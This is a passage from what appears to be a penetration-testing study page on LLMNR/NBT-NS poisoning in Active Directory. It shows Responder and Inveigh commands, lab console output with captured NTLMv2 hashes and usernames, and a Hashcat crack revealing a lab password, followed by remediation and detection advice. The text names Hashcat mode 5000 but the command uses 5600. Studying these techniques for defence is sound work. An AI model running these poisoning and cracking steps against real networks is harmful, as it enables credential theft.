+                        Network interface to use, you can use 'ALL' as a
+                        wildcard for all interfaces
+  -i 10.0.0.21, --ip=10.0.0.21
+                        Local IP to use (only for OSX)
+  -e 10.0.0.22, --externalip=10.0.0.22
+                        Poison all requests with another IP address than
+                        Responder's one.
+  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
+  -r, --wredir          Enable answers for netbios wredir suffix queries.
+                        Answering to wredir will likely break stuff on the
+                        network. Default: False
+  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.
+                        Answering to domain suffixes will likely break stuff
+                        on the network. Default: False
+  -f, --fingerprint     This option allows you to fingerprint a host that
+                        issued an NBT-NS or LLMNR query.
+  -w, --wpad            Start the WPAD rogue proxy server. Default value is
+                        False
+  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
+                        Upstream HTTP proxy used by the rogue WPAD Proxy for
+                        outgoing requests (format: host:port)
+  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
+                        retrieval. This may cause a login prompt. Default:
+                        False
+  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
+                        authentication for the proxy. WPAD doesn't need to be
+                        ON. This option is highly effective when combined with
+                        -r. Default: False
+  --lm                  Force LM hashing downgrade for Windows XP/2003 and
+                        earlier. Default: False
+  -v, --verbose         Increase verbosity.
+</code></pre>
+<p>The <code>-A</code> flag puts you into analyze mode, allowing you to see NBT-NS, BROWSER, and LLMNR requests in the environment without poisoning any responses. You must always supply either an interface or an IP. Some common options you'll typically want to use are <code>-wf</code>; this will start the WPAD rogue proxy server, while <code>-f</code> will attempt to fingerprint the remote host OS and version. You can use the <code>-v</code> flag for increased verbosity if you are running into issues, but this will lead to a lot of additional data printed to the console. Other options such as <code>-F</code> and <code>-P</code> can be used to force NTLM or Basic authentication and force proxy authentication, but may cause a login prompt, so they should be used sparingly. The use of the <code>-w</code> flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.</p>
+<p>With this configuration shown above, Responder will listen and answer to any requests it sees on the wire. If you are successful and manage to capture a hash, Responder will print it out on screen and write it to a log file per host located in the <code>/usr/share/responder/logs</code> directory. Hashes are saved in the format <code>(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt</code>, and one hash is printed to the console and stored in its associated log file unless -v mode is enabled. For example, a log file may look like <code>SMB-NTLMv2-SSP-172.16.5.25</code>. Hashes are also stored in a a SQLite DB that can be configured in the <code>Responder.conf</code> config file, typically located in <code>/usr/share/responder</code> unless you clone the Responder repo directly from GitHub.</p>
+<p>You must run the tool with sudo privileges or as root and make sure the following ports are availabe on your attack host for it to function best.</p>
+<pre><code>UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
+</code></pre>
+<p>If Responder successfully captured hashes, as seen below, you can find the hashes associated with each host/protocol in their own text file.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ ls
+
+Analyzer-Session.log                Responder-Session.log
+Config-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txt
+HTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txt
+Poisoners-Session.log               SMB-NTLMv2-SSP-172.16.5.50.txt
+Proxy-Auth-NTLMv2-172.16.5.200.txt
+</code></pre>
+<p>You can kick off a Responder session rather quickly:</p>
+<pre><code class="language-bash">sudo responder -I ens224 
+</code></pre>
+<p>Once you obtained (<em>enough</em>) hashes, you can pass these to Hashcat using hash mode 5000 for NTLMv2 hashes that you typically obtain with Responder. You may at times obtain NTLMv1 hashes and other type of hashes and can consult the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat example hashes</a> page to identify them and find the proper hash mode. If you ever obtain a strange or unknown hash, this site is a great reference to help identify it.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
+
+hashcat (v6.1.1) starting...
+
+&lt;SNIP&gt;
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f047800000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: NetNTLMv2
+Hash.Target......: FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80ba...000000
+Time.Started.....: Mon Feb 28 15:20:30 2022 (11 secs)
+Time.Estimated...: Mon Feb 28 15:20:41 2022 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1086.9 kH/s (2.64ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 10967040/14344385 (76.46%)
+Rejected.........: 0/10967040 (0.00%)
+Restore.Point....: 10960896/14344385 (76.41%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: L0VEABLE -&gt; Kittikat
+
+Started: Mon Feb 28 15:20:29 2022
+Stopped: Mon Feb 28 15:20:42 2022
+</code></pre>
+<h2 id="llmnr--nbt-ns-poisoning---from-windows"><a class="header" href="#llmnr--nbt-ns-poisoning---from-windows">LLMNR / NBT-NS Poisoning - from Windows</a></h2>
+<h3 id="inveigh"><a class="header" href="#inveigh">Inveigh</a></h3>
+<p>If you end up with a Windows host as your attack box, your client provides you with a Windows box to test from, or you land on a Windows host as a local admin via another method and would like to look to further your access, the tool Inveigh works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, and Proxy Auth.</p>
+<p>You can get started with the PowerShell version as follows and then list all possible parameters.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; Import-Module .\Inveigh.ps1
+PS C:\htb&gt; (Get-Command Invoke-Inveigh).Parameters
+
+Key                     Value
+---                     -----
+ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
+KerberosHostHeader      System.Management.Automation.ParameterMetadata
+ProxyIgnore             System.Management.Automation.ParameterMetadata
+PcapTCP                 System.Management.Automation.ParameterMetadata
+PcapUDP                 System.Management.Automation.ParameterMetadata
+SpooferHostsReply       System.Management.Automation.ParameterMetadata
+SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
+SpooferIPsReply         System.Management.Automation.ParameterMetadata
+SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
+WPADDirectHosts         System.Management.Automation.ParameterMetadata
+WPADAuthIgnore          System.Management.Automation.ParameterMetadata
+ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
+ConsoleStatus           System.Management.Automation.ParameterMetadata
+ADIDNSThreshold         System.Management.Automation.ParameterMetadata
+ADIDNSTTL               System.Management.Automation.ParameterMetadata
+DNSTTL                  System.Management.Automation.ParameterMetadata
+HTTPPort                System.Management.Automation.ParameterMetadata
+HTTPSPort               System.Management.Automation.ParameterMetadata
+KerberosCount           System.Management.Automation.ParameterMetadata
+LLMNRTTL                System.Management.Automation.ParameterMetadata
+
+&lt;SNIP&gt;
+</code></pre>
+<p>Start Inveigh with LLMNR and NBNS poisoning, and output to the console and write to a file.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+[*] Inveigh 1.506 started at 2022-02-28T19:26:30
+[+] Elevated Privilege Mode = Enabled
+[+] Primary IP Address = 172.16.5.25
+[+] Spoofer IP Address = 172.16.5.25
+[+] ADIDNS Spoofer = Disabled
+[+] DNS Spoofer = Enabled
+[+] DNS TTL = 30 Seconds
+[+] LLMNR Spoofer = Enabled
+[+] LLMNR TTL = 30 Seconds
+[+] mDNS Spoofer = Disabled
+[+] NBNS Spoofer For Types 00,20 = Enabled
+[+] NBNS TTL = 165 Seconds
+[+] SMB Capture = Enabled
+[+] HTTP Capture = Enabled
+[+] HTTPS Certificate Issuer = Inveigh
+[+] HTTPS Certificate CN = localhost
+[+] HTTPS Capture = Enabled
+[+] HTTP/HTTPS Authentication = NTLM
+[+] WPAD Authentication = NTLM
+[+] WPAD NTLM Authentication Ignore List = Firefox
+[+] WPAD Response = Enabled
+[+] Kerberos TGT Capture = Disabled
+[+] Machine Account Capture = Disabled
+[+] Console Output = Full
+[+] File Output = Enabled
+[+] Output Directory = C:\Tools
+WARNING: [!] Run Stop-Inveigh to stop
+[*] Press any key to stop console output
+WARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listener
+WARNING: [!] [2022-02-28T19:26:31] Exception calling "Start" with "0" argument(s): "An attempt was made to access a
+socket in a way forbidden by its access permissions" $HTTP_listener.Start()
+[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
+[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
+[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
+[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
+[+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
+[+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834
+[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834
+[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834
+
+&lt;SNIP&gt;
+</code></pre>
+<p>You can see that you immediately begin getting LLMNR and mDNS requests.</p>
+<p><img src="../../../../images/ad_sniffing_for_foothold1.gif" alt="sniffing for foothold 1" /></p>
+<h3 id="c-inveigh"><a class="header" href="#c-inveigh">C# Inveigh</a></h3>
+<p>The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version. Before you can use the C# version of the tool, you have to compile the executable.</p>
+<p>Running the C# version with the defaults and starting to capture hashes:</p>
+<pre><code class="language-powershell">PS C:\htb&gt; .\Inveigh.exe
+
+[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
+[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
+[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
+[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
+[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
+[ ] DHCPv6
+[+] DNS Packet Sniffer [Type A]
+[ ] ICMPv6
+[+] LLMNR Packet Sniffer [Type A]
+[ ] MDNS
+[ ] NBNS
+[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
+[ ] HTTPS
+[+] WebDAV [WebDAVAuth NTLM]
+[ ] Proxy
+[+] LDAP Listener [Port 389]
+[+] SMB Packet Sniffer [Port 445]
+[+] File Output [C:\Tools]
+[+] Previous Session Files (Not Found)
+[*] Press ESC to enter/exit interactive console
+[!] Failed to start HTTP listener on port 80, check IP and port usage.
+[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
+[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
+[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
+[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
+[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
+[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
+[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
+[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
+[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
+[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
+[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
+[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
+[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
+[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
+[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
+[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
+[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
+</code></pre>
+<p>As you can see, the tool starts and shows which options are enabled by default and which are not. The options with a <code>[+]</code> are default and enabled by default and the ones with a <code>[ ]</code> before them are disabled. The running console output also shows you which options are disabled and, therefore, responses are not being sent. You can also see the message <code>Press ESC to enter/exit interactive console</code>, which is very useful while running the tool. The console gives you access to captured credentials/hashes, allows you to stop Inveigh, and more.</p>
+<p>You can hit the <code>esc</code> key to enter the console while Inveigh is running.</p>
+<pre><code class="language-powershell">&lt;SNIP&gt;
+
+[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
+[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
+[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
+[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
+[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
+[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
+[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
+[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
+[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61310
+[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61311
+C(0:0) NTLMv1(0:0) NTLMv2(3:9)&gt; HELP
+</code></pre>
+<p>After typing <code>HELP</code> and hitting enter, you are presented with several options:</p>
+<pre><code class="language-powershell">
+=============================================== Inveigh Console Commands ===============================================
+
+Command                           Description
+========================================================================================================================
+GET CONSOLE                     | get queued console output
+GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses
+GET LOG                         | get log entries; add search string to filter results
+GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
+GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
+GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results
+GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results
+GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes
+GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes
+GET CLEARTEXT                   | get captured cleartext credentials
+GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials
+GET REPLYTODOMAINS              | get ReplyToDomains parameter startup values
+GET REPLYTOHOSTS                | get ReplyToHosts parameter startup values
+GET REPLYTOIPS                  | get ReplyToIPs parameter startup values
+GET REPLYTOMACS                 | get ReplyToMACs parameter startup values
+GET IGNOREDOMAINS               | get IgnoreDomains parameter startup values
+GET IGNOREHOSTS                 | get IgnoreHosts parameter startup values
+GET IGNOREIPS                   | get IgnoreIPs parameter startup values
+GET IGNOREMACS                  | get IgnoreMACs parameter startup values
+SET CONSOLE                     | set Console parameter value
+HISTORY                         | get command history
+RESUME                          | resume real time console output
+STOP                            | stop Inveigh
+</code></pre>
+<p>You can quickly view unique captured hashes by typing <code>GET NTLMV2UNIQUE</code>.</p>
+<pre><code class="language-powershell">
+================================================= Unique NTLMv2 Hashes =================================================
+
+Hashes
+========================================================================================================================
+backupagent::INLANEFREIGHT:B5013246091943D7:16A41B703C8D4F8F6AF75C47C3B50CB5:01010000000000001DBF1816222DD801DF80FE7D54E898EF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001DBF1816222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:010100000000000016010623222DD801B9083B0DCEE1D9520000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080016010623222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+
+&lt;SNIP&gt;
+</code></pre>
+<p>You can type in <code>GET NTLMV2USERNAMES</code> and see which usernames you have collected. This is helpful if you want a listing of users to perform additional enumeration against and see which are worth attempting tp crack offline using Hashcat.</p>
+<pre><code class="language-powershell">
+=================================================== NTLMv2 Usernames ===================================================
+
+IP Address                        Host                              Username                          Challenge
+========================================================================================================================
+172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\backupagent       | B5013246091943D7
+172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\forend            | 32FD89BD78804B04
+172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\clusteragent      | 28BF08D82FA998E4
+172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\wley              | 277AC2ED022DB4F7
+172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\svc_qualys   
+</code></pre>
+<h2 id="remediation"><a class="header" href="#remediation">Remediation</a></h2>
+<p>Mitre ATT&amp;CK lists this technique as ID: T1557.001, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay.</p>
+<p>There are a few ways to mitigate this attack. To ensure that these spoofing attacks are not possible, you can disable LLMNR and NBT-NS. As a word of caution, it is always worth slowly testing out a significant change like this to your environment carefully before rolling it out fully.</p>
+<p>You can disable LLMNR in Group Policy by going to Computer Configuration -&gt; Administrative Templates -&gt; Network -&gt; DNS Client and enabling "Turn OFF Multicast Name Resolution".</p>
+<p><img src="../../../../images/ad_sniffing_for_foothold2.png" alt="ad sniffing for foothold 2" /></p>
+<p>NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. You can do this by opening "Network and Sharing Center" und Control Panel, clicking on Change adapter settings, right-clicking on the adapter to view its properties, selecting Internet Protocol Version 4 (TCP/IP), and clicking the Properties button, then clicking on Advanced and selecting the WINS tab and finally selecting Disbale NetBIOS over TCP/IP.</p>
+<p><img src="../../../../images/ad_sniffing_for_foothold3.png" alt="ad sniffing for foothold 3" /></p>
+<p>While it is not possible to disable NBT-NS directly via GPO, you can create a PowerShell script under Computer Configuration -&gt; Windows Settings -&gt; Script (Startup/Shutdown) -&gt; Startup with something like the following:</p>
+<pre><code class="language-powershell">$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
+Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
+</code></pre>
+<p>In the Local Group Policy Editor, you will need to double click on Startup, choose the PowerShell Scripts tab, and select "For this GPO, run scripts in the following order" to Run Windows PowerShell scripts first, and then click on Add and choose the script. For these changes to occur, you would have to either reboot the target system or restart the network adapter.</p>
+<p><img src="../../../../images/ad_sniffing_for_foothold4.png" alt="ad sniffing for foothold 4" /></p>
+<p>To push this out to all hosts in a domain, you would create a GPO using Group Policy Management on the DC and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:</p>
+<pre><code>\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+</code></pre>
+<p><img src="../../../../images/ad_sniffing_for_foothold5.png" alt="ad sniffing for foothold 5" /></p>
+<p>Other mitigations include filtering network traffic to block LLMNR/NetBIOS traffic and enabling SMB Signing to prevent NTLM relay attacks. Network intrusion detection and prevention systems can also be used to mitigate this activity, while network segmentation can be used to isolate hosts that require LLMNR or NetBIOS enabled to operate correctly.</p>
+<h2 id="detection"><a class="header" href="#detection">Detection</a></h2>
+<p>It is not always possible to disable LLMNR and NetBIOS, and therefore you need ways to detect this type of attack behavior. One way is to use the attack against the attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any of the responses receive answers which would be indicative of an attacker spoofing name resolution responses. Read <a href="https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/">this</a>.</p>
+<p>Furthermore, hosts can be monitored for traffic on ports UDP 5355 and 137, and event IDs 4697 and 7045 can be monitored for. Finally, you can monitor the registry key <code>HKLM\Software\Policies\Microsoft\Windows NT\DNSClient</code> for changes to the <code>EnableMulticast</code> DWORD value. A value of 0 would mean that LLMNR is disabled.<!-- {% embed footer message="2025 • Created by [d41y](https://github.com/d41y)" %} --></p>
+<div data-embedify data-app="footer" data-option-message="2025 • Created by [d41y](https://github.com/d41y)" style="display:none"></div>
+<style>footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }</style><footer><p>2025 • Created by <a href="https://github.com/d41y">d41y</a></p></footer>
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../attack/windows/ad/enum_and_attacks/ad_initial_enum.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../../attack/windows/ad/enum_and_attacks/ad_user_hunting.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../attack/windows/ad/enum_and_attacks/ad_initial_enum.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../../attack/windows/ad/enum_and_attacks/ad_user_hunting.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../../elasticlunr.min.js"></script>
+        <script src="../../../../mark.min.js"></script>
+        <script src="../../../../searcher.js"></script>
+
+        <script src="../../../../clipboard.min.js"></script>
+        <script src="../../../../highlight.js"></script>
+        <script src="../../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="../../../../theme/pagetoc.js"></script>
+
+
+
+    </div>
+    </body>
+</html>
